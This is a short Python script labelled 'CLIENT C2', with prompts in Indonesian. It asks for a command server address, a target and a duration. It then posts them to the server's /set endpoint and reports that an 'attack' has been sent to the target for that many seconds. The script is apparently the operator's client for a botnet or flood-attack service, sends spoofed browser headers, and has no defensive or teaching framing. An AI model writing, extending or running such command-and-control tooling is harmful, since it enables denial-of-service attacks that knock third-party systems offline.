import requests, time, os
from colorama import Fore, Style

os.system("clear")
print(Fore.CYAN + "=== CLIENT C2 ===" + Style.RESET_ALL)

api = input(Fore.YELLOW + "MASUKAN API http://IP:PORT : " + Style.RESET_ALL)
target = input(Fore.GREEN + "MASUKAN TARGET : " + Style.RESET_ALL)
durasi = input(Fore.RED + "MASUKAN DURASI : " + Style.RESET_ALL)

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
    "Accept": "text/html,application/xhtml+xml,application/xml",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

try:
    res = requests.post(f"{api}/set", json={"target": target, "time": durasi}, headers=headers)
    if res.status_code == 200:
        print(Fore.CYAN + f"[+] Serangan dikirim ke {target} selama {durasi} detik" + Style.RESET_ALL)
    else:
        print(Fore.RED + "[!] Gagal mengirim perintah" + Style.RESET_ALL)
except Exception as e:
    print(Fore.RED + f"[!] ERROR: {e}" + Style.RESET_ALL)
